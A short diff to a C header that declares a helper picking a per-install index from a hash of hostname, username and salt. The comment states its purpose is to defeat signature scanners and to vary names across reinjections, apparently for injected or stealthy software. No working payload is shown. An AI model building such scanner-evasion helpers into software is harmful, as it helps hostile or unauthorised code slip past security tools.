@@ -49,6 +49,25 @@ int  cu_wrap_encrypt(const void *plain, size_t plain_len,
 int  cu_wrap_decrypt(const uint8_t *cipher, size_t cipher_len,
                      uint8_t *out, size_t outmax, size_t *out_len);
 
+/* ── Per-install deterministic pool-index picker ── *
+ * Returns  SHA-256(hostname || 0 || username || 0 || salt)  mod  n.
+ *
+ * Same machine + same user + same salt  → same index across every arm
+ *   (predictable behaviour; user sees the same class name / picked
+ *   value across every reinject).
+ * Different salt for the same host      → independent index selection
+ *   (so two callsites can each pick from their own pool without both
+ *   landing on the same slot).
+ * Different machine / user              → different index
+ *   (defeats signature scanners that look for a single hard-coded
+ *   value across every install).
+ *
+ * `n` must be non-zero. On any BCrypt / lookup failure the function
+ * falls back to `(pid ^ tick) % n` so callers still get a valid index
+ * (they can rely on the return being in [0, n)). Not intended for
+ * security decisions — this is a stealth-diversification helper. */
+unsigned cu_installsalt_index(const char *salt, unsigned n);
+
 #ifdef __cplusplus
 }
 #endif
